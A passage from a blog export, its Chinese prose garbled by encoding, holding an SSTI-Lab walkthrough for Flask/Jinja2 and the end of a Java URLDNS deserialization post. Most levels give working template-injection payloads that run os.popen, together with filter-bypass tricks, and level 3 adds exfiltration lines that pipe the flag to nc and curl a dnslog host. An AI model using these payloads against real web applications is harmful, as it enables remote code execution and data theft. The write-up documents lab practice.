alt="image-20230423224502505"></p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><blockquote><p>HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</p></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è™½ç„¶è¿™æ˜¯Javaååºåˆ—åŒ–æœ€ç®€å•çš„ä¸€æ¡é“¾ä½†æ˜¯æˆ‘ä¸€ç‚¹éƒ½æ²¡æ„Ÿè§‰è½»æ¾ï¼Œæ‰€ä»¥è¿™ç¯‡åˆ†æè¿˜æœ‰å¾ˆå¤šä¸è¶³ä¹‹å¤„ï¼Œæ„Ÿè§‰è‡ªå·±æ‰‹å†™åˆ†æä¹‹åå†å»çœ‹ysoserialä¸Šçš„URLDNSé“¾ä¼šè½»æ¾å¾ˆå¤šï¼Œä¸€å¼€å§‹ç›´æ¥æ‹¿é‚£ä¸ªé“¾åˆ†æä¸€ç›´æ²¡è¿›åº¦</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-Lab</title>
      <link href="/undefined/62614.html"/>
      <url>/undefined/62614.html</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>å‰é¢çš„è¯•æ¢å°±ä¸å¼„äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è¯•ä¸€ä¸‹çœ‹è‡ªå·±ç¯å¢ƒæœ‰æ²¡æœ‰é—®é¢˜<br>å…ˆç»™å‡ºpayloadï¼š<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").read()&#125;&#125;</code><br>è¿™é‡Œæ‰¾çš„æ˜¯<code>os._wrap_close</code>é€šè¿‡è„šæœ¬æœç´¢ä¸‹æ ‡ä¸º143ï¼Œåˆå§‹åŒ–ä¹‹åå¯ä»¥ä½¿ç”¨popenæ¥æ‰“å¼€flagï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å¡äº†æˆ‘å¾ˆä¹…ï¼Œå°±æ˜¯<code>&quot;type flag&quot;</code>æˆ‘ä¸€ç›´ä½¿ç”¨<code>&quot;cat flag&quot;</code>å¾—ä¸åˆ°flagï¼Œè€Œæˆ‘ä¸€å¼€å§‹æ˜¯ä¸çŸ¥é“typeè¿™ä¸ªå‘½ä»¤çš„ï¼Œçœ‹åˆ°<a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/">SSTI-Labsé¶åœº - o2takuXX ã® blogo2takuXX ã® blog</a>è¿™ç¯‡åšå®¢æ‰çŸ¥é“typeå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011836.png" alt="image-20230327201121406"><br>é€šè¿‡GPTçš„å›ç­”åº”è¯¥æ˜¯ç”±äºæˆ‘åœ¨Windowsä¸‹éƒ¨ç½²çš„ç¯å¢ƒå¯¼è‡´çš„é—®é¢˜ï¼Œæœ€ç»ˆä½¿ç”¨typeå¾—åˆ°flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011503.png" alt="image-20230327201153225"><br>å½“ç„¶å¯ä»¥ç”¨çš„æ¨¡å—å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ç½‘ä¸Šå…¶å®ƒåšä¸»çš„wpï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>&#123;&#123;`å¯ä»¥ç”¨`&#123;% %&#125;`æ¥ç»•è¿‡ï¼Œ`&#123;% %&#125;`ç”¨äºæ‰§è¡Œpythonä»£ç æ‰€ä»¥ç›´æ¥printä¸€ä¸‹å°±è¡Œpayloadï¼š`&#123;%print("".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").raead())%&#125;`![image-20230327201213126](https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012396.png)è¿™é‡Œä¹Ÿæ”¾ä¸€ä¸‹importæ–¹æ³•å®ç°ä¾¿äºæˆ‘è‡ªå·±ä»¥åæŸ¥çœ‹ï¼Œåœ¨`_frozen_importlib._ModuleLock`æ¨¡å—ä¸­æœ‰importæ–¹æ³•ï¼Œæœç´¢ä¸‹æ ‡ä¸º100payloadï¼š`&#123;%print(''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read())%&#125;`è¿™ç§æ–¹æ³•æ˜¯é€šè¿‡importæ–¹æ³•å¯¼å…¥osæ¨¡å—æ‰§è¡Œpopenå‡½æ•°æ¥å®ç°çš„## level 3è¿™ä¸€å…³æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡å¤–å¸¦åˆ°vpsæ¥å¾—åˆ°flagï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨dnslogå…ˆçœ‹å¤–å¸¦åˆ°vps`&#123;&#123;''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__builtins__'].eval("__import__('os').popen('type flag|nc vps port').read()")&#125;&#125;</code><br>åŒæ ·æ˜¯åˆ©ç”¨<code>_frozen_importlib._ModuleLock</code>æ¨¡å—ä¸­çš„æ–¹æ³•ä½†æ˜¯è¿™é‡Œå°±å¤šäº†ä¸€ä¸ª<code>__builtins__</code>è¿™ä¸ªæ¨¡å—è¿”å›ä¸€ä¸ªç”±å†…å»ºå‡½æ•°ï¼ˆå³pythonè‡ªå¸¦å‡½æ•°ï¼‰å‡½æ•°åç»„æˆçš„åˆ—è¡¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012454.png" alt="image-20230327201230329"><br>ç†è§£è¿™ä¸ªæ–¹æ³•æ‰§è¡Œå°±å¯ä»¥çœ‹æ‡‚payloadäº†ï¼Œå‰é¢çš„åŸç†æ²¡å˜ï¼Œ<code>__builtins__</code>æ˜¯objectçš„ä¸€ä¸ªå­ç±»ï¼Œæ‰€ä»¥å‰é¢å¯¼å…¥äº†objectå°±å¯ä»¥æœå¯»åˆ°<code>__builtins__</code>å°±ç›¸å½“äºå¯¼å…¥äº†ï¼Œevalæ˜¯å†…ç½®å‡½æ•°æ‰€ä»¥<code>__builtins__</code>å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œç„¶åå¯¼å…¥osæ¨¡å—ï¼Œ<code>type flag</code>å…ˆæ‰¾åˆ°flagç›®å½•é€šè¿‡ncå‘½ä»¤è¾“å‡ºåˆ°è‡ªå·±çš„vpsä¸Šï¼ŒWindowsä¸‹éœ€è¦è‡ªå·±å®‰è£…ä¸€ä¸‹ncå‘½ä»¤ï¼Œè¿™æ—¶å€™çœŸæ„Ÿè§‰å°†ç¯å¢ƒéƒ¨ç½²åˆ°Linuxä¸‹æ–¹ä¾¿å¾ˆå¤š<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012421.png" alt="image-20230327201251069"><br>ç„¶åçœ‹ä¸€ä¸‹å¤–å¸¦åˆ°dnslogä¸Šçš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://`type flag`.ou7jiq.dnslog.cn&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠ¥é”™äº†ï¼Œæ²¡è§£å†³å…ˆæ”¾ç€<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013947.png" alt="image-20230327201306652"></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†<code>[]</code>ä½¿ç”¨éå†æ¥ç»•è¿‡ï¼Œé…åˆ<code>__getitem__</code>é­”æœ¯æ–¹æ³•è¿›è¡Œå–å€¼<br>payloadï¼š<code>&#123;% for i in ''.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__=='Popen' %&#125;&#123;&#123; i.__init__.__globals__.__getitem__('os').popen('type flag').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>è¿™ä¸ªpayloadçš„å‰åŠéƒ¨åˆ†ç›¸å½“äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> i.__name__==<span class="string">&#x27;Popen&#x27;</span></span><br><span class="line">    éœ€è¦æ‰§è¡Œçš„å†…å®¹</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œpayloadå¾—åˆ°flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013616.png" alt="image-20230327201322430"></p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œä½¿ç”¨requestè¿›è¡Œç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request              #request.__init__.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line">request.args.x1    #getä¼ å‚</span><br><span class="line">request.values.x1  #æ‰€æœ‰å‚æ•°</span><br><span class="line">request.cookies      #cookieså‚æ•°</span><br><span class="line">request.headers      #è¯·æ±‚å¤´å‚æ•°</span><br><span class="line">request.form.x1    #postä¼ å‚(Content-Type:applicaation/x-www-form-urlencodedæˆ–                             multipart/form-data)</span><br><span class="line">request.data   #postä¼ å‚(Content-Type:a/b)</span><br><span class="line">request.json #postä¼ json  (Content-Type: application/json)</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹payloadä¸€ä¸‹å°±èƒ½ç†è§£äº†<br>getï¼š<code>?arg1=__builtins__&amp;arg2=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>postï¼š<code>code=&#123;&#123;().__class__.__base__.__subclasses__()[100].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013900.png" alt="image-20230327201347018"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>è¿‡æ»¤äº†ä¸‹åˆ’çº¿<code>_</code>ä½¿ç”¨<code>|attr</code>è¿‡æ»¤å™¨ï¼Œç±»ä¼¼äºLinuxä¸­çš„ç®¡é“ç¬¦<code>|</code>ç”¨å‰é¢çš„è¾“å‡ºä½œä¸ºåé¢çš„æ“ä½œå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">ç›¸å½“äº</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure><p>getï¼š<code>?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>postï¼š<code>code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281056075.png" alt="image-20230327205244185"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>è¿‡æ»¤äº†ç‚¹<code>.</code>ä½¿ç”¨ä¸­æ‹¬å·è¿›è¡Œç»•è¿‡æ¥æ‹¼æ¥å› ä¸ºç‚¹çš„åŠŸèƒ½å°±æ˜¯æ‹¼æ¥ä¸­æ‹¬å·ä¹Ÿæœ‰è¿™ä¸€åŠŸèƒ½<br>å°†å‰é¢çš„payloadæ”¹å†™ä¸€ä¸‹<br><code>&#123;&#123;''.__class__.__base__.__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read()&#125;&#125;</code><br>ç„¶åç”¨ä¸­æ‹¬å·å°†ç‚¹æ›¿æ¢<br><code>&#123;&#123;''['__class__']['__base__']['__subclasses__']()[100]['__init__']['__globals__']['__import__']('os')['popen']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057996.png" alt="image-20230327202039586"></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>è¿™å…³è¿‡æ»¤äº†ä¸€å †å…³é”®å­—ï¼Œæœ¬æ¥æƒ³fuzzä¸€ä¸‹ä½†æ˜¯æ²¡æ‰¾åˆ°å­—å…¸ç›´æ¥çœ‹wpçš„å§<br><code>&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;</code><br>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡<br><code>&#123;&#123;''['__cla''ss__']['__ba''se__']['__subcla''sses__']()[100]['__in''it__']['__glo''bals__']['__import__']('os')['pop''en']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057747.png" alt="image-20230328105734102"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>è¿‡æ»¤äº†æ•°å­—å³é™åˆ¶ç´¢å¼•ä½¿ç”¨<code>__getitem__</code>ç»•è¿‡<br>payloadï¼š<code>&#123;&#123;x.__init__.__globals__.__getitem__('__builtins__').eval("__import__('os').popen('type flag').read()")&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057504.png" alt="image-20230328105751445"><br>ä½¿ç”¨lipsumï¼Œflaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°<code>__builtins__</code>ï¼Œè€Œä¸”<code>lipsum.__globals__</code>å«æœ‰osæ¨¡å—ï¼š<code>&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;</code></p><p>payloadï¼š<code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>ä¹Ÿèƒ½æ‰“é€š</p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>è¯¥é¢˜wafï¼š<code>set config = None</code>ï¼Œç›®æ ‡æ˜¯å¾—åˆ°configå³é…ç½®æ–‡ä»¶è€Œä¸æ˜¯flag<br>è¿™é¢˜å¯ä»¥é€šè¿‡url_for()æˆ–è€…get_flashed_messages()æ–¹æ³•é…åˆ<br><strong>url_for()</strong> â€”- flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”<code>url_for.__globals__[&#39;__builtins__&#39;]</code>å«æœ‰<code>current_app</code></p><p><strong>get_flashed_messages()</strong> â€”- flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”<code>url_for.__globals__[&#39;__builtins__&#39;]</code>å«æœ‰<code>current_app</code></p><p><strong>current_app</strong> â€”- åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚<br>payloadï¼š  <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058523.png" alt="image-20230328105809669"><br>å¾ˆå¥‡æ€ªè¿™é‡Œåˆ©ç”¨url_for()å¤±è´¥äº†</p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>è¿™ä¸€å…³è¿‡æ»¤äº†å•å¼•å·<code>&#39;</code> åŒå¼•å·<code>&quot;</code> åŠ å·<code>+</code> å…³é”®å­—<code>request</code> ç‚¹å·<code>.</code> æ–¹æ‹¬å·<code>[]</code><br>æ„Ÿè§‰è¿™å…³è¿˜æ˜¯æŒºéš¾çš„<br>å…ˆçœ‹ä¸€äº›è¿‡æ»¤å™¨å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">å¸¸ç”¨çš„è¿‡æ»¤å™¨</span><br><span class="line"></span><br><span class="line">int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</span><br><span class="line"></span><br><span class="line">upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›</span><br><span class="line"></span><br><span class="line">trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›</span><br><span class="line"></span><br><span class="line">wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›</span><br><span class="line"></span><br><span class="line">reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›</span><br><span class="line"></span><br><span class="line">replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›</span><br><span class="line"></span><br><span class="line">escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚</span><br><span class="line"></span><br><span class="line">safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;ï¼›</span><br><span class="line"></span><br><span class="line">list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›</span><br><span class="line"></span><br><span class="line">abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›</span><br><span class="line"></span><br><span class="line">first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›</span><br><span class="line"></span><br><span class="line">sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›</span><br><span class="line"></span><br><span class="line">sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#x27;xiaotuo&#x27;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚</span><br><span class="line"></span><br><span class="line">length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</span><br></pre></td></tr></table></figure><p>å…ˆç¡®å®šä¸€ä¸ªåˆ©ç”¨çš„payload<br><code>&#123;&#123;lipsum.__globals__.get('os').popen('type flag').read()&#125;&#125;</code><br>ç„¶åå°±æ˜¯é€šè¿‡setè®¾ç½®å˜é‡æ­é…joinè¿›è¡Œæ›¿æ¢ç»•è¿‡<br>é€šè¿‡<code>&#123;&#123;lipsum|string|list&#125;`è·å¾—ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œç„¶åé€šè¿‡popå‡½æ•°å¯ä»¥å–å‡ºä½¿ç”¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello [&#x27;&lt;&#x27;, &#x27;f&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27; &#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;_&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;m&#x27;, &#x27;_&#x27;, &#x27;i&#x27;, &#x27;p&#x27;, &#x27;s&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;8&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;A&#x27;, &#x27;3&#x27;, &#x27;F&#x27;, &#x27;E&#x27;, &#x27;D&#x27;, &#x27;4&#x27;, &#x27;0&#x27;, &#x27;&gt;&#x27;]</span><br></pre></td></tr></table></figure>ä½¿ç”¨`|attr`å°†`.`æ›¿æ¢ï¼Œå¾—åˆ°`&#123;&#123;lipsum|attr("__globals__")|attr("get")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>ç„¶åæ„é€ å­—ç¬¦ç»•è¿‡å¼•å·é™åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1) | join %&#125;</span><br><span class="line">&#123;% set o=dict(os=1) | join %&#125;</span><br><span class="line">&#123;% set p=dict(popen=1) |join %&#125;</span><br><span class="line">&#123;% set r=dict(read=1) | join %&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶payloadä¸º<br><code>&#123;&#123;lipsum|attr("__globals__")|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>ç„¶åå†æ„é€ <code>&quot;__globals__&quot;</code><br>å…ˆçœ‹ä¸‹åˆ’çº¿æ„é€ æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ä¸‹åˆ’çº¿å’Œglobalsæ‹¼æ¥èµ‹å€¼ç»™globalå½¢æˆ<code>&quot;__globals__&quot;</code><br><code>&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</code><br>æ­¤æ—¶payloadä¸º<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>ç„¶åå†æ„é€ <code>&quot;type flag&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br></pre></td></tr></table></figure><p>ä¸­é—´æœ‰ä¸ªç©ºæ ¼ï¼Œæ„é€ ä¸ªç©ºæ ¼<br><code>&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</code><br>ç„¶åæ‹¼æ¥èµ‹å€¼ç»™ä¸€ä¸ªæ–°å˜é‡<br><code>&#123;% set cmd=(t,space,f)|join%&#125;</code><br>åˆ°è¿™é‡Œæ„é€ å®Œæˆï¼Œæ­¤æ—¶çš„payloadä¸º<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</code><br>ç„¶åç»¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set 